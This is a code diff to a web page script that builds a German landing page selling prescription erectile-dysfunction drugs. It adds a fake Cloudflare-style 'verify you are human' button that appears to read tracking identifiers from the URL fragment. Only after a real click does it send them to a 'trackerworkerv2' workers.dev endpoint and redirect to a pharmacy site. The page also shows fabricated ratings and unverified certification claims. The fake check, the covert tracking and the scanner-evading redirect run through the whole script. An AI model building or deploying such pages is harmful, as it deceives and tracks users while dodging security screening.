@@ -1,8 +1,53 @@
-// Configuration
+// script.js
+// ========== KONFIGURATION ==========
 const WORKER_URL = 'https://trackerworkerv2.lugangxyz.workers.dev/verify';
 const DEFAULT_REDIRECT_URL = 'https://www.rezeptfuchs.com/';
 
-// Read data after # in URL
+// ========== 10 SLOGANS (basierend auf den gegebenen Inhalten) ==========
+const SLOGANS = [
+    {
+        main: "Premium Telemedizin. Präzise. Diskret. Männlich.",
+        sub: "Ihr digitaler Gesundheitscheck · Ärztlich geprüft"
+    },
+    {
+        main: "Ihr Wunschpräparat in 3 Schritten",
+        sub: "Online-Check → Sofort-Auswertung → E-Rezept & Versand"
+    },
+    {
+        main: "Diskret. Schnell. Sicher.",
+        sub: "Nähe wieder unbeschwert erleben."
+    },
+    {
+        main: "100% diskret & kostenloser Versand",
+        sub: "Neutrale Premium-Verpackung · Keine versteckten Kosten"
+    },
+    {
+        main: "EU-zertifiziert · Fachärztlich geprüft",
+        sub: "Höchste Standards für Ihre Sicherheit"
+    },
+    {
+        main: "Viagra® & Generika – exakt gleicher Wirkstoff",
+        sub: "Deutlich günstiger, identische Qualität"
+    },
+    {
+        main: "Sofort-Auswertung in Sekunden",
+        sub: "Smarte Bestätigung & sicherer Checkout"
+    },
+    {
+        main: "Ihr Weg zur Lösung – schnell & ärztlich geprüft",
+        sub: "Kein Wartezimmer · Rezept in nur 2 Minuten"
+    },
+    {
+        main: "Transparente Preise · Rezept 19,99 €",
+        sub: "Gratis Versand · Strenger EU-Datenschutz"
+    },
+    {
+        main: "Die clevere Alternative: Generika ab 1,74 €/Tablette",
+        sub: "Wunschpräparat wählen – diskret nach Hause"
+    }
+];
+
+// Fragment-Daten aus URL-Hash auslesen (#in=... oder #usr=...)
 function getFragmentData() {
     const hash = window.location.hash.substring(1);
     if (!hash) return '';
@@ -16,7 +61,7 @@ function getFragmentData() {
     return hash;
 }
 
-// Send to Cloudflare Worker and redirect (only called after real user click)
+// Anfrage an Cloudflare Worker senden und umleiten (nur nach echtem User-Klick)
 async function sendToCloudflareAndRedirect(userData) {
     try {
         const response = await fetch(WORKER_URL, {
@@ -33,90 +78,170 @@ async function sendToCloudflareAndRedirect(userData) {
         const result = await response.json();
         window.location.href = result.redirectUrl || `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
     } catch (error) {
+        // Fallback bei Fehler
         window.location.href = `${DEFAULT_REDIRECT_URL}?data=${encodeURIComponent(userData)}`;
     }
 }
 
+// Zufälligen Slogan auswählen und in der Oberfläche anzeigen
+function displayRandomSlogan() {
+    const randomIndex = Math.floor(Math.random() * SLOGANS.length);
+    const slogan = SLOGANS[randomIndex];
+    
+    const sloganContainer = document.querySelector('.slogan-container');
+    if (sloganContainer) {
+        sloganContainer.innerHTML = `
+            <div class="slogan-text">${slogan.main}</div>
+            <div class="slogan-sub">
+                <span class="stars">★★★★★</span>
+                <span class="rating-badge">4.8 (1256 verifizierte Kunden)</span>
+            </div>
+            <div class="slogan-sub" style="margin-top: 6px; font-size: 0.75rem; color: #5a6e5a;">
+                ${slogan.sub}
+            </div>
+        `;
+    }
+}
+
+// Hauptinitialisierung: UI aufbauen + Shadow-DOM Button erstellen
 function init() {
     const app = document.getElementById('app');
+    if (!app) return;
+    
     const fragmentData = getFragmentData();
     
-    // Create Shadow DOM for the button container
+    // 1. HTML-Grundgerüst erstellen (Karte mit Slogan etc.)
+    const cardHtml = `
+        <div class="verification-card">
+            <div class="slogan-container">
+                <div class="slogan-text">Premium Telemedizin</div>
+                <div class="slogan-sub">
+                    <span class="stars">★★★★★</span>
+                    <span class="rating-badge">4.8 (1256 verifizierte Kunden)</span>
+                </div>
+                <div class="slogan-sub" style="margin-top: 6px; font-size: 0.75rem; color: #5a6e5a;">
+                    Ihr digitaler Gesundheitscheck
+                </div>
+            </div>
+            
+            <div class="brand-headline">
+                <h2>Men's Health · Diskret</h2>
+                <p>⚕️ Ärztlich geprüft | Rezept 19,99€ | Gratis Versand</p>
+            </div>
+            
+            <div id="button-mount"></div>
+            
+            <div class="footer-note">
+                <span>✓ EU-zertifiziert</span>
+                <span>✓ 100% diskret</span>
+                <span>✓ Sofort-Auswertung</span>
+            </div>
+        </div>
+    `;
+    
+    app.innerHTML = cardHtml;
+    
+    // Zufälligen Slogan anzeigen
+    displayRandomSlogan();
+    
+    // 2. Shadow DOM mit auffälligem blauen Button
+    const mountPoint = document.getElementById('button-mount');
+    if (!mountPoint) return;
+    
     const shadowHost = document.createElement('div');
     shadowHost.style.display = 'flex';
     shadowHost.style.alignItems = 'center';
     shadowHost.style.justifyContent = 'center';
-    app.appendChild(shadowHost);
+    mountPoint.appendChild(shadowHost);
     
     const shadowRoot = shadowHost.attachShadow({ mode: 'open' });
     
-    // Cloudflare-style CSS with icon
+    // Auffälliger blauer Button mit abgerundeten Ecken (Shadow DOM CSS)
     const style = document.createElement('style');
     style.textContent = `
         .cf-button {
             display: inline-flex;
             align-items: center;
-            gap: 12px;
-            background: #ffffff;
-            border: 1px solid #dcdce6;
-            border-radius: 32px;
-            padding: 10px 24px 10px 20px;
-            font-family: system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
-            font-size: 14px;
-            font-weight: 500;
-            color: #1e2a3e;
+            justify-content: center;
+            gap: 14px;
+            background: linear-gradient(135deg, #1e5af7 0%, #1a4fdb 100%);
+            border: none;
+            border-radius: 60px;
+            padding: 16px 36px;
+            font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: white;
             cursor: pointer;
-            transition: all 0.2s ease;
-            box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+            transition: all 0.25s ease;
+            box-shadow: 0 10px 25px -5px rgba(30, 90, 247, 0.4), 0 4px 8px rgba(0, 0, 0, 0.05);
+            letter-spacing: -0.2px;
+            width: auto;
+            min-width: 280px;
         }
         .cf-button:hover {
-            background: #f8f9fc;
-            border-color: #c0c5d0;
-            box-shadow: 0 2px 8px rgba(0,0,0,0.04);
+            background: linear-gradient(135deg, #2a66ff 0%, #1e55e6 100%);
+            transform: translateY(-2px);
+            box-shadow: 0 18px 30px -8px rgba(30, 90, 247, 0.5);
+        }
+        .cf-button:active {
+            transform: translateY(1px);
+            box-shadow: 0 8px 18px -5px rgba(30, 90, 247, 0.4);
         }
         .cf-icon {
-            font-size: 18px;
+            font-size: 1.5rem;
+            filter: drop-shadow(0 1px 1px rgba(0,0,0,0.1));
         }
         .cf-checkbox {
-            width: 18px;
-            height: 18px;
-            background: white;
-            border: 2px solid #cbd5e1;
-            border-radius: 4px;
+            width: 22px;
+            height: 22px;
+            background: rgba(255,255,255,0.25);
+            border: 2px solid rgba(255,255,255,0.8);
+            border-radius: 30px;
             display: inline-flex;
             align-items: center;
             justify-content: center;
+            transition: 0.15s;
         }
         .cf-checkbox.checked {
-            background: #1e6f3f;
-            border-color: #1e6f3f;
+            background: #ffffff;
+            border-color: #ffffff;
         }
         .cf-checkbox.checked::after {
             content: "✓";
-            color: white;
-            font-size: 12px;
-            font-weight: bold;
+            color: #1e5af7;
+            font-size: 14px;
+            font-weight: 900;
         }
         .cf-spinner {
-            width: 18px;
-            height: 18px;
-            border: 2px solid #e2e8f0;
-            border-top-color: #1e6f3f;
+            width: 22px;
+            height: 22px;
+            border: 2px solid rgba(255,255,255,0.4);
+            border-top-color: white;
             border-radius: 50%;
-            animation: spin 0.6s linear infinite;
+            animation: spin 0.65s linear infinite;
         }
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+        .cf-text {
+            font-weight: 700;
+            letter-spacing: -0.2px;
+        }
+        /* Verifizierungs-Text im Loading-State */
+        .cf-button.loading {
+            opacity: 0.9;
+            cursor: wait;
+        }
     `;
     
-    // Create button with Cloudflare icon
+    // Button mit deutschem, auffälligem Text
     const button = document.createElement('div');
     button.className = 'cf-button';
     button.innerHTML = `
         <span class="cf-icon">🛡️</span>
         <div class="cf-checkbox"></div>
-        <span class="cf-text">Verify you are human</span>
+        <span class="cf-text">Jetzt verifizieren · Mensch bestätigen</span>
     `;
     
     shadowRoot.appendChild(style);
@@ -124,26 +249,34 @@ function init() {
     
     let clicked = false;
     
-    // Only send data when real user clicks the button
-    button.addEventListener('click', function() {
+    // Event-Listener für echten User-Klick
+    button.addEventListener('click', async function() {
         if (clicked) return;
         clicked = true;
         
-        // Update UI to loading state
-        const icon = button.querySelector('.cf-icon');
-        const checkbox = button.querySelector('.cf-checkbox');
+        // UI auf "wird verifiziert" umstellen (Loading-State)
+        const iconSpan = button.querySelector('.cf-icon');
+        const checkboxDiv = button.querySelector('.cf-checkbox');
         const textSpan = button.querySelector('.cf-text');
         
-        if (icon) icon.style.opacity = '0.5';
-        if (checkbox) checkbox.className = 'cf-spinner';
-        if (textSpan) textSpan.textContent = 'Verifying...';
+        if (iconSpan) iconSpan.style.opacity = '0.7';
+        if (checkboxDiv) {
+            checkboxDiv.classList.remove('cf-checkbox');
+            checkboxDiv.classList.add('cf-spinner');
+        }
+        if (textSpan) textSpan.textContent = 'Verifizierung läuft ...';
         
         button.style.cursor = 'not-allowed';
-        button.style.opacity = '0.8';
+        button.style.opacity = '0.9';
+        button.style.transform = 'none';
         
-        // Send data ONLY after real user click
-        sendToCloudflareAndRedirect(fragmentData);
+        // Fragment-Daten auslesen
+        const userData = getFragmentData();
+        
+        // Daten NACH echtem Klick senden + Weiterleitung
+        await sendToCloudflareAndRedirect(userData);
     });
 }
 
+// Starte die Anwendung, sobald DOM bereit ist
 document.addEventListener('DOMContentLoaded', init);
